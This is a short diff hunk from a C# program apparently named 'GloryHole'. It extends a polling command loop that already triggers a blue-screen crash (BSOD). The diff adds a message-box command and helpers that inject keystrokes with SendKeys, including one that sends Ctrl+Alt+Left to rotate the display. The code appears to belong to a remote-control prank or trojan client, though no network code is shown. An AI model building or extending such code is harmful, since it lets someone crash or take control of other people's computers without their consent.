@@ -58,18 +58,35 @@ namespace GloryHole
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
                                     BSOD();
                                     break;
+                                case (CommandTypes.MessageBox):
+                                    MessageBox.Show("sdf");
+                                    break;
                             }
                         }
                     }
-                    catch(Exception e) 
+                    catch (Exception e)
                     {
-                        #if DEBUG
-                            Console.WriteLine(e.Message);
-                        #endif
+#if DEBUG
+                        Console.WriteLine(e.Message);
+#endif
                     }
                 Thread.Sleep(500);
             }
+
+        }//sda
+
+        public static void WriteText(string txt)
+        {
+            System.Windows.Forms.SendKeys.SendWait(txt);
         }
+
+
+
+        public static void swap()
+        {
+            System.Windows.Forms.SendKeys.SendWait("^%{LEFT}");
+        }//sdb
+
 
         /// <summary>
         /// Чистит, сохраняет и закрывает документ
